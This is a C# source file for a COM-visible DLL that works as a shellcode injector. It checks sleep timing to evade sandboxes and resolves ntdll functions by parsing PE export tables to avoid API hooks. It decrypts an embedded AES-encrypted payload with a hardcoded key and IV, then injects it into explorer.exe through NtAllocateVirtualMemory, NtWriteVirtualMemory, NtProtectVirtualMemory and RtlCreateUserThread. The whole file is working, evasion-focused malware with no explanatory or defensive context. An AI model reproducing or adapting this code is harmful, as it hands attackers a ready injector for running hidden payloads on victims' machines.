using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
namespace dll
{
    [ComVisible(true)]
    public class Class1
    {
	
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
	public static void runner()
        {
		
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtOpenProcess");
            DELEGATES.NtOpenProcess NtOpenProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenProcess)) as DELEGATES.NtOpenProcess;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtProtectVirtualMemory");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtAllocateVirtualMemory");
            DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWriteVirtualMemory");
            DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "RtlCreateUserThread");
            DELEGATES.RtlCreateUserThread RtlCreateUserThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlCreateUserThread)) as DELEGATES.RtlCreateUserThread;

            string MyKey = "77-46-5E-E6-C7-12-AC-F0-27-56-B3-02-48-D3-1F-8B-63-D2-D1-C1-3B-6A-8E-7C-A3-8B-57-AC-A4-F3-77-75";
            string Myiv = "2E-FC-C7-84-4C-76-82-11-26-9B-19-97-9C-67-6A-AA";
            byte[] buf = new byte[1536] {0x3f, 0x62, 0x03, 0xbd, 0xe0, 0x38, 0xa8, 0xd7, 0x37, 0xc8, 0x7c, 0xaa, 0x38, 0x48, 0x4f, 0xfa, 0xae, 0xe9, 0x36, 0xd3, 0x06, 0x64, 0xcb, 0x7c, 0x71, 0x34, 0xdd, 0xec, 0x2a, 0x38, 0xfe, 0x5a, 0xa3, 0xcf, 0xb2, 0x1e, 0xb5, 0x66, 0x39, 0xcb, 0x28, 0x02, 0xe1, 0xc1, 0x65, 0xe7, 0xb9, 0x2e, 0x86, 0x2d, 0xc3, 0x26, 0x47, 0x6f, 0x93, 0xac, 0x62, 0x18, 0x31, 0x8f, 0x3f, 0x0f, 0xbc, 0x20, 0x73, 0x33, 0xa9, 0xe8, 0x13, 0x05, 0x01, 0xa6, 0xf4, 0xd1, 0x6c, 0x5d, 0x8c, 0xf6, 0xb4, 0xc6, 0x14, 0xb7, 0x2f, 0x46, 0x78, 0x10, 0x3d, 0x1f, 0xf5, 0x43, 0x55, 0xe3, 0xe1, 0x08, 0xb9, 0x5c, 0x0b, 0xe5, 0x1e, 0xe5, 0x78, 0xff, 0x14, 0x14, 0x5e, 0xb3, 0x27, 0xce, 0xb8, 0xa0, 0x5b, 0x08, 0x00, 0x0f, 0x86, 0xea, 0x60, 0x7c, 0x4b, 0x29, 0xf0, 0xd5, 0xaa, 0x71, 0xfd, 0x27, 0x59, 0x9e, 0x67, 0xa2, 0xe4, 0xf5, 0x90, 0x58, 0xf5, 0x47, 0xd1, 0x68, 0xfe, 0xcf, 0x92, 0x83, 0xaf, 0x42, 0xe0, 0xb8, 0x5f, 0x4d, 0x0d, 0x6e, 0x70, 0x56, 0x52, 0x5a, 0xf9, 0x0e, 0x23, 0x39, 0x76, 0x93, 0x79, 0x12, 0x9f, 0x8d, 0x50, 0x63, 0x0a, 0x06, 0xaa, 0xa9, 0xb6, 0xf3, 0x83, 0xc2, 0x19, 0x7b, 0xa9, 0xd2, 0xb4, 0x31, 0xc3, 0x7c, 0x5c, 0x69, 0x9d, 0x34, 0xb8, 0xd9, 0x87, 0xe7, 0x8d, 0xb6, 0x45, 0xb4, 0x5b, 0xad, 0x32, 0x83, 0x59, 0xf9, 0xbc, 0xa0, 0x0a, 0xd6, 0x0c, 0x69, 0xc0, 0xa3, 0x59, 0xc6, 0xb3, 0x3e, 0x08, 0x24, 0x3c, 0x3d, 0x69, 0x86, 0x00, 0x5a, 0x51, 0x9d, 0x38, 0xb3, 0x99, 0x1d, 0x55, 0x75, 0xa2, 0x23, 0xa1, 0x29, 0x27, 0x98, 0xa5, 0x5a, 0x0f, 0x53, 0x2e, 0x34, 0x6a, 0xf3, 0x46, 0x16, 0xe8, 0x6a, 0x46, 0x12, 0xbe, 0x7d, 0x95, 0x4f, 0x1c, 0x25, 0x83, 0x7a, 0xb7, 0xe3, 0x44, 0xd0, 0xb1, 0x8b, 0x66, 0x9a, 0x45, 0xf3, 0x54, 0xcf, 0x1c, 0x5d, 0xc4, 0x09, 0x13, 0xe2, 0xec, 0xd4, 0x53, 0xc8, 0xc1, 0x3b, 0x0f, 0x24, 0x84, 0xdd, 0xb4, 0x2c, 0x68, 0x4b, 0xae, 0x95, 0xde, 0x32, 0x6e, 0x51, 0x84, 0x42, 0xe4, 0x09, 0xa9, 0x82, 0xe1, 0x97, 0x8d, 0x9a, 0x4e, 0x62, 0x53, 0x4b, 0x83, 0x37, 0x7b, 0xb1, 0x37, 0xb6, 0x44, 0x89, 0x4a, 0x76, 0x87, 0xcb, 0xff, 0x8a, 0x89, 0xe5, 0x15, 0x36, 0xc6, 0x47, 0x2a, 0x6d, 0x59, 0x8b, 0xde, 0xaf, 0x77, 0x34, 0x15, 0x22, 0xf8, 0xdd, 0xb6, 0xcd, 0xf4, 0xc2, 0x4f, 0xb9, 0xd4, 0x62, 0x28, 0x5d, 0xd0, 0x39, 0x19, 0x24, 0xdf, 0xc3, 0x04, 0xed, 0xe1, 0xe9, 0xbf, 0xe9, 0x2c, 0xb9, 0x18, 0x99, 0x68, 0x95, 0x84, 0x7d, 0x10, 0x2a, 0x08, 0x23, 0x58, 0xdf, 0x38, 0xcd, 0x4c, 0xd7, 0x08, 0xaa, 0x87, 0x0f, 0x59, 0xee, 0x1d, 0xca, 0x38, 0xd8, 0x82, 0x87, 0x63, 0xda, 0xe3, 0x95, 0xa0, 0x2e, 0x9c, 0x25, 0xa9, 0x92, 0xa7, 0x8a, 0x7a, 0x72, 0xc7, 0x49, 0x6f, 0x9b, 0x4b, 0x8d, 0x46, 0xe5, 0x68, 0x16, 0x0d, 0xc5, 0x26, 0x7f, 0xe6, 0xd4, 0xc3, 0x80, 0x03, 0x8b, 0x7d, 0x78, 0x60, 0x73, 0x72, 0x12, 0x92, 0xb3, 0x83, 0x5f, 0x51, 0x59, 0x34, 0xdd, 0x95, 0x6f, 0xc2, 0xab, 0xc8, 0x1c, 0xe1, 0xf5, 0x5c, 0xea, 0xf6, 0x8f, 0xba, 0x95, 0x85, 0xb2, 0x5b, 0x4a, 0x08, 0x6b, 0x1f, 0x4b, 0xfe, 0xb9, 0x3f, 0x59, 0x35, 0x75, 0xe5, 0x11, 0x93, 0x36, 0xe7, 0x39, 0x91, 0x56, 0xec, 0xbe, 0xf5, 0x63, 0x6e, 0xdf, 0x76, 0xb3, 0x58, 0x3b, 0x32, 0x02, 0xe1, 0xef, 0xa2, 0x0e, 0x9a, 0x37, 0x22, 0x13, 0x09, 0x79, 0xa6, 0x26, 0xc1, 0x61, 0x4e, 0xbd, 0x09, 0x8d, 0x35, 0xff, 0x39, 0x99, 0x5e, 0x88, 0x62, 0x39, 0xcf, 0xbd, 0x44, 0x99, 0x26, 0x79, 0xe0, 0x1f, 0x48, 0x97, 0xef, 0xb8, 0x26, 0x62, 0x95, 0x58, 0xf9, 0xf1, 0xb9, 0x4f, 0x0e, 0xf6, 0xe2, 0x9d, 0x02, 0xef, 0xb2, 0x54, 0x1e, 0xb6, 0x46, 0xb7, 0x0d, 0x3d, 0xbe, 0x1d, 0x01, 0x1b, 0xf7, 0x43, 0xce, 0xd0, 0x1e, 0x09, 0x53, 0x8d, 0xb3, 0x32, 0x9f, 0xf0, 0xcd, 0x7a, 0xfa, 0xfb, 0xa9, 0x9f, 0x42, 0xfb, 0x1a, 0xc8, 0x3b, 0x5d, 0xbb, 0x2e, 0xa1, 0x9a, 0xcc, 0x3d, 0x83, 0x43, 0x07, 0x03, 0xf4, 0x04, 0xf4, 0xd4, 0xd9, 0xac, 0xc0, 0x87, 0x30, 0x2f, 0x41, 0x78, 0x51, 0xaa, 0xe9, 0x4e, 0xb0, 0x2c, 0xda, 0xba, 0x62, 0x77, 0xa2, 0x05, 0x45, 0x19, 0x83, 0x6b, 0x1f, 0xed, 0x32, 0xab, 0x43, 0x86, 0x62, 0x0c, 0x65, 0x3e, 0x91, 0xc5, 0x77, 0x6a, 0x9a, 0x56, 0x4d, 0x0a, 0xcf, 0x6c, 0xa5, 0x9f, 0xd8, 0x83, 0xc0, 0x76, 0xb2, 0xab, 0xde, 0x8b, 0x64, 0x0e, 0x7f, 0xc3, 0xaa, 0x47, 0xb4, 0xc9, 0xcd, 0x1f, 0x6f, 0xf7, 0xa3, 0x03, 0x74, 0xf6, 0xa0, 0xb1, 0xfd, 0xeb, 0x37, 0xdc, 0xf1, 0x5a, 0xac, 0xd4, 0x15, 0x18, 0xc2, 0xff, 0x87, 0x15, 0xb4, 0xd8, 0xe8, 0x04, 0x3d, 0x1d, 0x3e, 0x9f, 0xed, 0x5d, 0x90, 0x92, 0x75, 0x51, 0xd2, 0xf3, 0x34, 0x90, 0xf7, 0x9a, 0x62, 0x39, 0x30, 0xb4, 0x3c, 0x9b, 0x9f, 0xa7, 0x60, 0x21, 0x27, 0x2a, 0xd0, 0xb0, 0x73, 0x00, 0x2a, 0x4b, 0x46, 0x17, 0xe3, 0xec, 0xec, 0x24, 0x8e, 0x9e, 0x73, 0x4d, 0xfe, 0x63, 0xff, 0xf4, 0x63, 0x70, 0xbd, 0x08, 0x54, 0xc7, 0xa5, 0x26, 0xc6, 0x23, 0x95, 0x4e, 0xbe, 0x4f, 0xed, 0x85, 0xda, 0x02, 0x87, 0x52, 0xeb, 0x77, 0x25, 0x13, 0xb4, 0xc5, 0x91, 0x06, 0xde, 0x9c, 0xd7, 0x53, 0x22, 0x9d, 0xc4, 0xfa, 0xc4, 0xb9, 0xaa, 0xc0, 0x1b, 0x59, 0xdd, 0x94, 0x90, 0x15, 0xda, 0xc5, 0x98, 0x28, 0x54, 0x2a, 0xa3, 0xb6, 0x62, 0x2d, 0x47, 0x62, 0xf4, 0xcb, 0x85, 0x8b, 0x70, 0x6e, 0x88, 0xbd, 0xf6, 0x71, 0x55, 0xa8, 0x63, 0x80, 0x0a, 0xc0, 0x88, 0xab, 0xbf, 0x6a, 0x6d, 0x6e, 0x96, 0x6b, 0x3a, 0xb2, 0x84, 0xfa, 0x43, 0x29, 0xab, 0x18, 0x01, 0xb8, 0x2a, 0x10, 0xd0, 0xb0, 0xc2, 0xea, 0x60, 0x7c, 0xf6, 0x76, 0xf7, 0xab, 0x1c, 0x9a, 0xde, 0x90, 0x60, 0x35, 0x07, 0x4c, 0xa0, 0x6c, 0xf8, 0x0b, 0xe1, 0xef, 0xa7, 0x2b, 0x53, 0x4c, 0x77, 0x33, 0x92, 0x9b, 0x47, 0x9d, 0x8d, 0x37, 0x20, 0x17, 0x7a, 0xa6, 0xcd, 0xd7, 0x38, 0x70, 0x68, 0xd8, 0xd9, 0xff, 0xdc, 0x00, 0x29, 0x1a, 0x68, 0x2b, 0xff, 0xc2, 0x8a, 0x37, 0xea, 0x8d, 0xb9, 0x7e, 0x9a, 0x91, 0xed, 0xe0, 0xf8, 0x49, 0x1b, 0xe6, 0x7b, 0xe6, 0xb1, 0x8c, 0xc7, 0xdf, 0xbf, 0x6b, 0xa3, 0x30, 0xe6, 0xcf, 0x59, 0x79, 0x42, 0x07, 0x98, 0x21, 0x9c, 0x55, 0x40, 0x94, 0xac, 0xe9, 0xad, 0xb5, 0xd2, 0x6f, 0x28, 0xea, 0xb5, 0x3f, 0x11, 0x11, 0x08, 0x85, 0x6a, 0xfb, 0x16, 0x72, 0x8a, 0x6e, 0x82, 0xa4, 0x8e, 0x5e, 0x6d, 0x60, 0x10, 0x70, 0x27, 0xee, 0x56, 0x55, 0xdc, 0x77, 0x05, 0x51, 0x0b, 0x6a, 0x77, 0xad, 0xb6, 0x32, 0x35, 0x00, 0xe7, 0x94, 0x10, 0x87, 0xeb, 0xd9, 0x0d, 0xae, 0xb5, 0xed, 0x96, 0x7b, 0x3a, 0xfb, 0x98, 0x3d, 0x33, 0x6e, 0x05, 0xe2, 0x7a, 0xb8, 0x90, 0xd5, 0x84, 0x40, 0xcb, 0xeb, 0x4c, 0xa4, 0xa8, 0xc4, 0xf2, 0xc5, 0xa5, 0x2c, 0x41, 0x0d, 0xb4, 0x8b, 0x18, 0x6c, 0xd8, 0x0a, 0x47, 0xca, 0x5c, 0xda, 0x9a, 0x97, 0x3c, 0xc7, 0x39, 0x5e, 0x29, 0xa3, 0x20, 0x09, 0xc8, 0x97, 0x39, 0x16, 0x57, 0xf6, 0xd0, 0x98, 0x44, 0x2e, 0xa6, 0xfc, 0xb1, 0x62, 0xa2, 0x76, 0x3e, 0x1a, 0xb2, 0x52, 0xec, 0x2e, 0xa8, 0x92, 0xba, 0x1c, 0xea, 0x96, 0xa7, 0xbf, 0xc0, 0xba, 0x95, 0xfb, 0x24, 0x15, 0x10, 0xee, 0xe9, 0x31, 0x24, 0x31, 0x04, 0x95, 0xc7, 0x62, 0x35, 0xd5, 0x8b, 0x78, 0xaa, 0x04, 0x16, 0xce, 0x46, 0x40, 0x30, 0x59, 0xca, 0xe0, 0xc6, 0x28, 0x20, 0x96, 0xab, 0xc2, 0x57, 0x9a, 0x87, 0xc3, 0x63, 0xe3, 0xe2, 0xae, 0x62, 0xac, 0xea, 0xe3, 0x51, 0xf3, 0x16, 0xd4, 0x00, 0x6e, 0xe9, 0x04, 0xfa, 0x79, 0x0f, 0x54, 0x3e, 0x9c, 0xa7, 0x7c, 0x2e, 0xcb, 0xd7, 0x78, 0xac, 0x1b, 0x34, 0x53, 0xc5, 0xa8, 0xee, 0xb1, 0x57, 0x45, 0x0b, 0x2b, 0xa3, 0x06, 0x8d, 0x5a, 0x36, 0xe6, 0xfb, 0x32, 0x38, 0xb5, 0x85, 0x54, 0x1a, 0x89, 0x58, 0x8a, 0x61, 0x5a, 0xee, 0x8e, 0x48, 0x7a, 0xa0, 0x74, 0x70, 0x8e, 0x3b, 0x09, 0xef, 0x3c, 0xa8, 0xb6, 0x7c, 0x85, 0x7b, 0xa9, 0xa7, 0x49, 0x7e, 0xd7, 0x59, 0xa0, 0xfb, 0x51, 0x6c, 0x2a, 0xbc, 0xb9, 0x7b, 0x7d, 0x8c, 0x63, 0xfb, 0xc1, 0x5d, 0x00, 0x0e, 0x07, 0x54, 0x9a, 0x23, 0x8e, 0x65, 0x8d, 0xe1, 0xa5, 0xd3, 0x86, 0x37, 0x9c, 0x53, 0x68, 0xd9, 0x69, 0x2c, 0x55, 0x46, 0x79, 0xfa, 0x1c, 0x67, 0x96, 0xad, 0x90, 0xc0, 0x16, 0xa2, 0x9f, 0xf7, 0xd2, 0xf0, 0xbe, 0xc0, 0xa4, 0xc8, 0x90, 0xd3, 0x17, 0x93, 0x0e, 0x6b, 0x6f, 0x91, 0x26, 0x67, 0x6e, 0xe5, 0x06, 0x19, 0x10, 0xc1, 0xfc, 0x39, 0xb4, 0x35, 0xf8, 0xa7, 0xa1, 0xfc, 0xcc, 0x9d, 0x14, 0x32, 0xc6, 0x2b, 0x67, 0xc4, 0x39, 0x7c, 0xe5, 0x1e, 0x5d, 0x35, 0xcc, 0x65, 0x8c, 0xcb, 0x09, 0xbe, 0xcb, 0xc1, 0x5e, 0x48, 0xb3, 0x30, 0x5b, 0xa3, 0xec, 0xde, 0x81, 0x0a, 0x2f, 0x42, 0xfa, 0x68, 0x77, 0x06, 0x7c, 0xca, 0x00, 0x03, 0x6e, 0xad, 0xb9, 0x04, 0x45, 0xf7, 0x51, 0xc5, 0x46, 0x6e, 0x04, 0xca, 0x56, 0xc8, 0xb5, 0xf7, 0x4d, 0x85, 0x57, 0xb2, 0x91, 0x3f, 0x00, 0x14, 0x43, 0x86, 0xb8, 0x78, 0x12, 0x53, 0xf6, 0x33, 0x9b, 0x53, 0xae, 0xb9, 0xe6, 0x54, 0x4d, 0xc9, 0x00, 0x61, 0xa9, 0x77, 0x84, 0xb5, 0x02, 0xf8, 0xd4, 0x8e, 0xe3, 0x19, 0xc2, 0x2c, 0xb7, 0x12, 0x03, 0x3d, 0xab, 0xae, 0x42, 0x6b, 0xed, 0x7d, 0xa3, 0x5e, 0xcc, 0xdb, 0xeb, 0xe0, 0x44, 0xb2, 0xe8, 0xf2, 0x80, 0x0d, 0xc9, 0x4b, 0x5b, 0x3a, 0x28, 0xf8, 0x13, 0x50, 0x80, 0x22, 0x17, 0x5f, 0x75, 0xe4, 0x00, 0x3c, 0x44, 0x1e, 0xe1, 0x19, 0xb5, 0x36, 0x31, 0xf4, 0x7a, 0x82, 0x89, 0x6e, 0x3b, 0xee, 0x7e, 0xe6, 0xff, 0x37, 0x0a, 0xbf, 0xac, 0xff, 0xdf, 0x72, 0x9e, 0x7c, 0x7c, 0x10, 0x9d, 0xe8, 0x67, 0x5b, 0x68, 0xf4, 0xe3, 0xfc, 0xe8, 0x24, 0x5f, 0x23, 0x0c, 0x4e, 0x0c, 0xce, 0xf0, 0xe7, 0x8b, 0x3d, 0x9c, 0x80, 0x42, 0x53, 0x7f, 0x84, 0xd5, 0xc3, 0x07, 0x25, 0xa5, 0xb7, 0xeb, 0x27, 0x77, 0x3e, 0xe4, 0x42, 0x6b, 0x8d, 0xd3, 0xf5, 0x4b, 0x25, 0xa5, 0xb4, 0x33, 0x85, 0xc7, 0x2c, 0x50, 0xd0, 0x0b, 0x39, 0xa0, 0x0f, 0xc6, 0x2f, 0x13, 0x7e, 0xf8, 0x17, 0xb8, 0x03, 0xa7, 0x7a, 0xb8, 0x6c, 0x54, 0xdb, 0x4c, 0xe1, 0x7b, 0x87, 0x07, 0x5b, 0xd2, 0x5d, 0x3d, 0x2e, 0xee, 0x06, 0x37, 0x29, 0xe5, 0xa8, 0x00, 0x44, 0x61, 0x69, 0x6a, 0x66, 0x76, 0x1a, 0x44, 0x8f, 0x73, 0x33, 0x26, 0xb6, 0x13, 0xc4, 0x51, 0x80, 0xae, 0x0d, 0x08, 0xf8, 0x75, 0xc6, 0xfd, 0xb5, 0xc5, 0xda, 0x6b, 0xb2, 0x8a, 0x50, 0x34, 0x72, 0xfb, 0xd1, 0xd3, 0x62, 0x70, 0x72, 0x20, 0xa5, 0x7d};
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);
            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            string[] roundnodash = roundtrip.Split('-');
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            Process[] localByName = Process.GetProcessesByName("explorer");
            IntPtr ProcessHandle = IntPtr.Zero;
            STRUCTS.OBJECT_ATTRIBUTES oa = new STRUCTS.OBJECT_ATTRIBUTES();
            STRUCTS.CLIENT_ID ci = new STRUCTS.CLIENT_ID();
            ci.UniqueProcess = (IntPtr)localByName[0].Id;
            NtOpenProcess(ref ProcessHandle, STRUCTS.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref oa, ref ci);
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            IntPtr pAllocationSize = new IntPtr(Convert.ToUInt32(e.Length));
            uint allocationType = 0x3000;
            uint protection = 0x00000004;
            NtAllocateVirtualMemory(ProcessHandle, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
            UInt32 nread = 0;
            NtWriteVirtualMemory.DynamicInvoke(ProcessHandle, pMemoryAllocation, e, (UInt32)e.Length, nread);
            UInt32 oldprotect = 0;
            IntPtr bufferlength = new IntPtr(e.Length);
            NtProtectVirtualMemory.DynamicInvoke(ProcessHandle, pMemoryAllocation, bufferlength, 0x20, oldprotect);

            IntPtr thread = IntPtr.Zero;
            RtlCreateUserThread(ProcessHandle, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, pMemoryAllocation, IntPtr.Zero, ref thread, IntPtr.Zero); 
	}
	
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                    throw new ArgumentNullException("Key");
                if (IV == null || IV.Length <= 0)
                    throw new ArgumentNullException("IV");
                string plaintext = null;
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = Key;
                    aesAlg.IV = IV;
                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
        }
            
    }
    
    public class DELEGATES
        {
            //injection delegates
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, Int32 NewProtect, ref UInt32 OldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtOpenProcess(ref IntPtr ProcessHandle, STRUCTS.ProcessAccessFlags DesiredAccess, ref STRUCTS.OBJECT_ATTRIBUTES ObjectAttributes, ref STRUCTS.CLIENT_ID ClientId);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, IntPtr ZeroBits, IntPtr MaximumStackSize, IntPtr CommittedStackSize, IntPtr StartAddress, IntPtr Parameter, ref IntPtr Thread, IntPtr ClientId);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);
        }
    public class STRUCTS
    {
        [Flags]
        public enum ProcessAccessFlags : UInt32
        {
            PROCESS_ALL_ACCESS = 0x001F0FFF
        }
        public struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName; // -> UNICODE_STRING
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }
    }
    public class Invoke
    {
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }

        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
    }
}